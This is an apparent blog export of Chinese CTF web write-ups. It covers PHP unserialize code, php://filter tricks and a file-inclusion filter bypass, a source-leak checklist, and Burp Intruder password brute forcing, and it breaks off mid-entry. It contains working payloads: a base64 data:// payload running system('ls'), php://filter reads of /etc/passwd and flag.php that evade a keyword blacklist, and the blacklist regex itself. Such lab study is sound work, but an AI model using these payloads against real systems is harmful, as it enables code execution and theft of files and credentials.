<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>i春秋web-Login</title>
    <link href="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/"/>
    <url>/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/</url>
    
    <content type="html"><![CDATA[<h1 id="i春秋web-Login"><a href="#i春秋web-Login" class="headerlink" title="i春秋web-Login"></a>i春秋web-Login</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><span class="hljs-variable">$requset</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>, <span class="hljs-variable">$_SESSION</span>, <span class="hljs-variable">$_COOKIE</span>);  <span class="hljs-comment">//通过 array_merge 合并了来自 $_GET、$_POST、$_SESSION 和 $_COOKIE 的数据。这样做的目的是将所有用户输入合并到一个数组中，供后续处理。</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">db</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$where</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;where))<br>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;where);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$where</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&#x27;select * from user where &#x27;</span>.<span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$requset</span>[<span class="hljs-string">&#x27;token&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$login</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">gzuncompress</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$requset</span>[<span class="hljs-string">&#x27;token&#x27;</span>])));<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">db</span>();<br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-string">&#x27;user=\&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;user&#x27;</span>] === <span class="hljs-string">&#x27;ichunqiu&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] !== <span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;unserialize injection!!&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(╯‵□′)╯︵┴─┴ &quot;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php?error=1&#x27;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="i春秋-web-文件包含绕过"><a href="#i春秋-web-文件包含绕过" class="headerlink" title="i春秋  web 文件包含绕过"></a>i春秋  web 文件包含绕过</h1><p>一篇关于详解php:&#x2F;&#x2F;filter以及死亡绕过的文章：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a>  还有这个 <a href="https://blog.csdn.net/gental_z/article/details/122303393">https://blog.csdn.net/gental_z/article/details/122303393</a></p><h2 id="PHP-Filter协议介绍"><a href="#PHP-Filter协议介绍" class="headerlink" title="PHP Filter协议介绍"></a><code>PHP Filter</code>协议介绍</h2><p> <code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如<code>base64</code>编码处理，<code>rot13</code>处理等。官方解释为：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">php://<span class="hljs-built_in">filter</span> 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（<span class="hljs-keyword">all</span>-in-one）的文件函数非常有用，类似 <span class="hljs-built_in">readfile</span>()、 <span class="hljs-keyword">file</span>() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 <br></code></pre></td></tr></table></figure><h3 id="Filter协议的使用方法："><a href="#Filter协议的使用方法：" class="headerlink" title="Filter协议的使用方法："></a><strong>Filter协议的使用方法：</strong></h3><p><strong>Filter协议的一般语法为：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/过滤器|过滤器/</span>resource=待过滤的数据流<br></code></pre></td></tr></table></figure><p>其中过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理。例如：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo file_get_contents(&quot;php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure><p>对<?php phpinfo();?>这个字符串进行了两次base64编码处理。</p><p>php filter的过滤器有很多种，根据官方文档（<a href="https://www.php.net/manual/zh/filters.php%EF%BC%89%EF%BC%8C%E5%A4%A7%E8%87%B4%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E5%9B%9B%E7%B1%BB%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E5%8E%8B%E7%BC%A9%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E5%8A%A0%E5%AF%86%E8%BF%87%E6%BB%A4%E5%99%A8">https://www.php.net/manual/zh/filters.php），大致可以分为四类：字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</a></p><h4 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a><strong>字符串过滤器</strong></h4><p>以string字符串开头，常见的过滤器有rot13、toupper、tolower、strip_tags等，例如：</p><h5 id="string-rot13即对数据流进行str-rot13函数处理"><a href="#string-rot13即对数据流进行str-rot13函数处理" class="headerlink" title="string.rot13即对数据流进行str_rot13函数处理"></a>string.rot13即对数据流进行str_rot13函数处理</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.rot13/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/13940bfc94bfb2c7c791a45afa7cfa02-1.png" alt="13940bfc94bfb2c7c791a45afa7cfa02-1"></p><h5 id="toupper、tolower是对字符串进行大小写转换处理："><a href="#toupper、tolower是对字符串进行大小写转换处理：" class="headerlink" title="toupper、tolower是对字符串进行大小写转换处理："></a>toupper、tolower是对字符串进行大小写转换处理：</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">string</span>.<span class="hljs-built_in">toupper</span>/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/a4923543eb570ae42eef0d38cfba27ee.png" alt="a4923543eb570ae42eef0d38cfba27ee"></p><h5 id="strip-tags对数据流进行strip-tags函数的处理，该函数功能为剥去字符串中的-HTML、XML-以及-PHP-的标签，简单理解就是包含有尖括号中的东西。"><a href="#strip-tags对数据流进行strip-tags函数的处理，该函数功能为剥去字符串中的-HTML、XML-以及-PHP-的标签，简单理解就是包含有尖括号中的东西。" class="headerlink" title="strip_tags对数据流进行strip_tags函数的处理，该函数功能为剥去字符串中的 HTML、XML 以及 PHP 的标签，简单理解就是包含有尖括号中的东西。"></a>strip_tags对数据流进行strip_tags函数的处理，该函数功能为剥去字符串中的 HTML、XML 以及 PHP 的标签，简单理解就是包含有尖括号中的东西。</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/6aadd6386a193fb34aa071a5437f2fba-1.png" alt="6aadd6386a193fb34aa071a5437f2fba-1"></p><h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><p>主要含有三类，分别是base64的编码转换、quoted-printable的编码转换以及iconv字符编码的转换。该类过滤器以convert开头。</p><h5 id="base64的编码转换操作，例如："><a href="#base64的编码转换操作，例如：" class="headerlink" title="base64的编码转换操作，例如："></a>base64的编码转换操作，例如：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/38761f1bfc87b03b347e482b83ab0f19-1.png" alt="38761f1bfc87b03b347e482b83ab0f19-1"></p><h5 id="Quoted-printable可译为可打印字符引用编码，可以理解为将一些不可打印的ASCII字符进行一个编码转换，转换成-后面跟两个十六进制数，例如："><a href="#Quoted-printable可译为可打印字符引用编码，可以理解为将一些不可打印的ASCII字符进行一个编码转换，转换成-后面跟两个十六进制数，例如：" class="headerlink" title="Quoted-printable可译为可打印字符引用编码，可以理解为将一些不可打印的ASCII字符进行一个编码转换，转换成&#x3D;后面跟两个十六进制数，例如："></a>Quoted-printable可译为可打印字符引用编码，可以理解为将一些不可打印的ASCII字符进行一个编码转换，转换成&#x3D;后面跟两个十六进制数，例如：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.quoted-printable-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/7aa06b21bb89b121edc0d73dd2ade398.png" alt="7aa06b21bb89b121edc0d73dd2ade398"></p><h5 id="iconv过滤器也就是对输入输出的数据进行一个编码转换，"><a href="#iconv过滤器也就是对输入输出的数据进行一个编码转换，" class="headerlink" title="iconv过滤器也就是对输入输出的数据进行一个编码转换，"></a>iconv过滤器也就是对输入输出的数据进行一个编码转换，</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">其格式为convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;.&lt;output-<span class="hljs-keyword">encoding</span>&gt;或者convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;/&lt;output-<span class="hljs-keyword">encoding</span>&gt;，表达的意思都是相同的，即将输入的字符串编码转换成输出指定的编码<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">file_get_contents(<span class="hljs-string">&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=data://text/plain,m1sn0w&quot;</span>.chr(<span class="hljs-number">12</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一眼文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">先简单了解一下什么是文件包含：开发人员一般会把重复使用的函数写到单个文件中，当需要使用这个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。那正常来说包含的文件是固定的、写死的就不会存在文件包含漏洞，但是这样的话又不够便捷，所以开发人员为了使代码调用更加灵活，就会将被包含的文件设置为变量，用来进行动态调用。但正是由于这种灵活性，允许用户从客户端提交一个变量值来作为文件包含的变量值，当这个值是段恶意代码时，并且服务端又没有对用户的输入进行一个很好的过滤，就会造成文件包含漏洞。<br><br>注：(实现文件包含功能的函数：<span class="hljs-keyword">include</span>、<span class="hljs-keyword">require</span>、<span class="hljs-keyword">include_once</span>、<span class="hljs-keyword">require_once</span>、highlight_file、show_source、file_get_contents、fopen、file、readline。各种函数作用、用法，大家还是百度吧)<br><br>本题的php源代码乍一看就是利用filename参数带一段恶意代码进去，然后<span class="hljs-keyword">include</span>函数执行恶意代码进而找到flag。事实也是这样，不过会遇到很多过滤，要想办绕过去。<br></code></pre></td></tr></table></figure><p>先试试data伪协议的poc，do not hack，不知道什么被过滤了….。慢慢试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">filename=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br>base64解密为<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>发现如果没有 base 和 encode 就不会被过滤，不会出现do not hack!</strong></p><p>php的文件包含漏洞，可以用到各种伪协议如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-number">1.</span>伪协议种类<br><span class="hljs-symbol">    file:</span><span class="hljs-comment">// 访问本地文件系统</span><br><span class="hljs-symbol">    http:</span><span class="hljs-comment">// 访问http(s）网址</span><br><span class="hljs-symbol">    ftp:</span><span class="hljs-comment">// 访问ftp</span><br><span class="hljs-symbol">    php:</span><span class="hljs-comment">// 访问各个输入/输出流</span><br><span class="hljs-symbol">    zlib:</span><span class="hljs-comment">// 压缩流</span><br><span class="hljs-symbol">    data:</span><span class="hljs-comment">// 数据</span><br><span class="hljs-symbol">    rar:</span><span class="hljs-comment">// RAR压缩包</span><br><span class="hljs-symbol">    ogg:</span><span class="hljs-comment">// 音频流</span><br><br> <span class="hljs-number">2.</span>本题而言，用到的是php:<span class="hljs-comment">//伪协议，其他伪协议试了都不太中， </span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">php:</span><span class="hljs-comment">//伪协议用法，例如：php://input,用于执行php代码，（需要post请求提交数据）。</span><br><span class="hljs-symbol">php:</span><span class="hljs-comment">//filter,用于读取源码，?filename=php://filter/read=convert.base64/resource=/etc/passwd</span><br></code></pre></td></tr></table></figure><p>但是，都是不通，看wp说是用 <code>convert.iconv.[]</code>过滤器绕过，然后根据上面所学的内容进行构造payload</p><p>这时运用上面的绕过方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.SJIS\*.UCS-2/</span>resource=check.php<br></code></pre></td></tr></table></figure><p>有很多的编码方式，可以都试试看哪个没被绕过</p><p>成功绕过，发现check.php为过滤格式，没有flag，内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>])&#123; <br>    <span class="hljs-variable">$preg_match_username</span> = <span class="hljs-string">&#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$preg_match_username</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack!&quot;</span>); <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.SJIS\*.UCS-2/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="i春秋-web-123"><a href="#i春秋-web-123" class="headerlink" title="i春秋  web 123"></a>i春秋  web 123</h1><p>查看源码发现提示，登陆个试试。没错当然登陆失败，只能再想办法了。</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/1.png" alt="image-20241114182923435"></p><p>又发现，提示说用户信息都在user.php里，访问试试，不出所料什么也。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常见的Web源码泄露漏洞<br><br><span class="hljs-code">    git源码泄露</span><br><span class="hljs-code"></span><br>Git是一个开源的分布式版本控制系统，每次执行初始化目录的时候会在当前目录下自动创建一个.git目录，用于记录代码的变更记录等<br><br><span class="hljs-code">    svn源码泄露</span><br><span class="hljs-code"></span><br>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn/entries文件，获取到服务器源码。<br><br><span class="hljs-code">    hg源码泄露</span><br><span class="hljs-code"></span><br>Mercurial 是一种轻量级分布式版本控制系统，使用初始化的时候会生成.hg。<br><br><span class="hljs-code">    cvs泄露</span><br><span class="hljs-code"></span><br>CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。<br><br><span class="hljs-code">    bazzaar/bzr泄露</span><br><span class="hljs-code"></span><br>bzr也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。<br><br><span class="hljs-code">    备份压缩文件泄露</span><br><span class="hljs-code"></span><br>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。<br>常见的备份文件后缀：<br><br><span class="hljs-code">    .rar</span><br><span class="hljs-code"></span><br><span class="hljs-code">    .zip</span><br><span class="hljs-code"></span><br><span class="hljs-code">    .7z</span><br><span class="hljs-code"></span><br><span class="hljs-code">    .tar.gz</span><br><span class="hljs-code"></span><br><span class="hljs-code">    .bak</span><br><span class="hljs-code"></span><br><span class="hljs-code">    .txt</span><br><span class="hljs-code">s</span><br><span class="hljs-code">    .old</span><br><span class="hljs-code"></span><br><span class="hljs-code">    .temp</span><br><span class="hljs-code"></span><br><span class="hljs-code">    WEB-INF/web.xml泄露</span><br><span class="hljs-code"></span><br>WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br><br>WEB-INF 主要包含以下文件或目录：<br><br>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.<br>WEB-INF/database.properties : 数据库配置文件<br>WEB-INF/classes/ : 一般用来存放Java类文件(.class)<br>WEB-INF/lib/ : 用来存放打包好的库(.jar)<br>WEB-INF/src/ : 用来放源代码(.asp和.php等)<br><br><span class="hljs-code">    1</span><br><span class="hljs-code">    2</span><br><span class="hljs-code">    3</span><br><span class="hljs-code">    4</span><br><span class="hljs-code">    5</span><br><span class="hljs-code"></span><br><span class="hljs-code">    DS_Store文件泄露</span><br><span class="hljs-code"></span><br>.DS<span class="hljs-emphasis">_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_</span>Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。<br><br><span class="hljs-code">    SWP文件泄露</span><br><span class="hljs-code"></span><br>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。<br><br><span class="hljs-code">    Github源码泄露</span><br><span class="hljs-code"></span><br>GitHub是一个面向开源及私有软件项目的托管平台。很多人喜欢把自己的代码上传到平台托管，通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。<br></code></pre></td></tr></table></figure><p>这个可以用到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">   备份压缩文件泄露<br><br>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。<br>常见的备份文件后缀：<br><span class="hljs-meta"></span><br><span class="hljs-meta">    .rar</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    .zip</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    .7z</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    .tar</span><span class="hljs-number">.</span>gz<br><span class="hljs-meta"></span><br><span class="hljs-meta">    .bak</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    .txt</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    .old</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    .temp</span><br><br>    WEB-<span class="hljs-meta">INF</span>/web<span class="hljs-number">.</span>xml泄露<br></code></pre></td></tr></table></figure><p>一个一个试试，发现是.bak，访问后自动下载，查看后，发现所有用户名</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/2.png" alt="image-20241114183324847"></p><p>接下来应该就是爆破密码了。下面是几个爆破的方法。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Burpsuite Intruder模块Position介绍<br><br>Attack Type:<br><br><span class="hljs-code">    Sniper 狙击手模式，只针对一个位置进行探测。</span><br><span class="hljs-code"></span><br><span class="hljs-code">    就是只有一个变量是需要爆破的</span><br><span class="hljs-code"></span><br><span class="hljs-code">    Battering ram 撞击物模式，针对多个位置使用一个Payload。</span><br><span class="hljs-code"></span><br><span class="hljs-code">    有多个变量需要爆破，但是只使用同一个字典</span><br><span class="hljs-code"></span><br><span class="hljs-code">    Pitchfork 交叉模式，针对多个位置使用不同的多个Payload。</span><br><span class="hljs-code"></span><br><span class="hljs-code">    有多个变量需要破解，针对每个变量各自分配不同字典，字典爆破顺序都是每次按字典顺序依次</span><br><span class="hljs-code"></span><br><span class="hljs-code">    Cluster Bomb 集束炸弹模式，针对多个位置，全部组合。</span><br><span class="hljs-code"></span><br><span class="hljs-code">    有多个变量需要破解，针对每个变量各自分配不同字典，与Pitchfork 单叉模式不同的是，此模式下字典是组合使用，例如字典1的第一个量，与字典2的全部量依次对应，然后就是字典1的第二个量与字典2的全部对应，就是这样不断枚举爆破</span><br></code></pre></td></tr></table></figure><p>这里因为不知道出生日期，所以用集束炸弹这个模式，1，2的位置直接导入文件，3的位置设置从1990到2000进行爆破：</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/3.png" alt="image-20241114183941670"></p><p>爆破出用户名和密码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 